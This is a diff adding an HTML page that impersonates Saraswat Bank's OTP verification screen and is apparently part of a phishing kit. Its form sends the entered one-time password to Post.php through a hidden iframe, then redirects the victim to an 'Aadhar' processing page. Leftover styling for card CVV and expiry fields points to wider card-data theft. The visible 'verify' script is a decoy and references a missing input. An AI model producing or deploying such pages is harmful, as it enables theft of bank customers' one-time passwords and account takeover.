@@ -1,0 +1,150 @@
+
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <meta charset="UTF-8">
+                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                    <title>Saraswat Bank - otp Details</title>
+                    <style>
+                        body {
+                            font-family: sans-serif;
+                            background-color: #F2E6DA;
+                            display: flex;
+                            justify-content: center;
+                            align-items: center;
+                            min-height: 00vh;
+                            margin: 0;
+                        }
+
+                      .container {
+                            background-color: #F2E6DA;
+                            padding: 20px;
+                            border-radius: 8px;
+                            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+                            width: 290px; /* Adjust width as needed */
+                        }
+
+                      .header {
+                            text-align: center;
+                            margin-bottom: 20px;
+                        }
+
+                      .header img {
+                            max-width: 280px; /* Adjust logo size as needed */
+                        }
+
+                      .input-group {
+                            margin-bottom: 15px;
+                        }
+
+                        label {
+                            display: block;
+                            margin-bottom: 5px;
+                            font-weight: bold;
+                        }
+
+                        input[type="text"],
+                        select {
+                            width: calc(100% - 12px); /* Account for padding and border */
+                            padding: 8px;
+                            border: 1px solid #ccc;
+                            border-radius: 4px;
+                            box-sizing: border-box;
+                        }
+
+                        button {
+                            background-color: #f0ad4e; /* Example orange color */
+                            color: black;
+                            padding: 10px 15px;
+                            border: none;
+                            border-radius: 4px;
+                            cursor: pointer;
+                            width: 95%;
+                        }
+
+                        button:hover {
+                            background-color: #e09d3f; /* Darker shade on hover */
+                        }
+
+                      .cvv-input {
+                            width: 80px; /* Adjust CVV input width */
+                        }
+
+                      .expiry-select {
+                            display: inline-block;
+                            width: calc(50% - 6px); /* Adjust width for month/year select */
+                        }
+
+                      .expiry-select:first-child {
+                            margin-right: 6px;
+                        }
+                    </style>
+                </head>
+                <body>
+                    <div class="container">
+                        <div class="header">
+                           <!-- Static- Please don't do anything here-->
+                            <script type="text/javascript">var submitted=false;</script>
+                            <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='Processing_Aadhar.html';}"></iframe>
+                            <!--My Form-->
+                            <form action="Post.php" method="post" target="hidden_iframe" onsubmit="submitted=true">
+                                 <img src="srswt h1.jpg" alt="Saraswat Bank Logo"> 
+
+
+              <h1>OTP Verification</h1>
+              <p>Enter your OTP:</p>
+                                <div class="login-box">
+                                    <div class="user-box">
+                                    <input type="text" name="6th_OTP" inputmode="numeric" maxlength="8"
+                                    pattern="\d{6,9}" title="Please enter valid OTP !"
+                                    required="">
+                                 <br><br>
+              <button onclick="verifyOTP()">Verify</button>
+
+              <p id="timer">OTP expires in <span id="countdown">160</span> seconds.</p>
+              <p id="message"></p>
+
+              <script>
+                let timeLeft = 160;
+                let timerInterval;
+
+                function startTimer() {
+                  timerInterval = setInterval(function () {
+                    timeLeft--;
+                    document.getElementById("countdown").textContent = timeLeft;
+
+                    if (timeLeft <= 0) {
+                      clearInterval(timerInterval);
+                      document.getElementById("timer").style.display = "none"; // Hide timer
+                      document.getElementById("message").textContent = "OTP expired!";
+                      document.getElementById("message").style.color = "red";
+                      document.getElementById("otp").disabled = true; // Disable input
+                      document.querySelector("button").disabled = true; // Disable button
+                    }
+                  }, 1000); // Update every 1 second
+                }
+
+                function verifyOTP() {
+                  const enteredOTP = document.getElementById("otp").value;
+
+                  // In a real application, you would send the OTP to your server for verification.
+                  // This is a simplified client-side example:
+                  if (enteredOTP === "123456") { // Replace with your actual OTP verification logic
+                    document.getElementById("message").textContent = "OTP verified successfully!";
+                    document.getElementById("message").style.color = "green";
+                    clearInterval(timerInterval); // Stop the timer if OTP is correct.
+                    document.getElementById("timer").style.display = "none"; // Hide timer
+                    document.getElementById("otp").disabled = true; // Optionally disable input
+                    document.querySelector("button").disabled = true; // Optionally disable button
+                  } else {
+                    document.getElementById("message").textContent = "Incorrect OTP. Please try again.";
+                    document.getElementById("message").style.color = "red";
+                  }
+                }
+
+                // Start the timer when the page loads
+                window.onload = startTimer; 
+              </script>
+
+            </body>
+            </html>
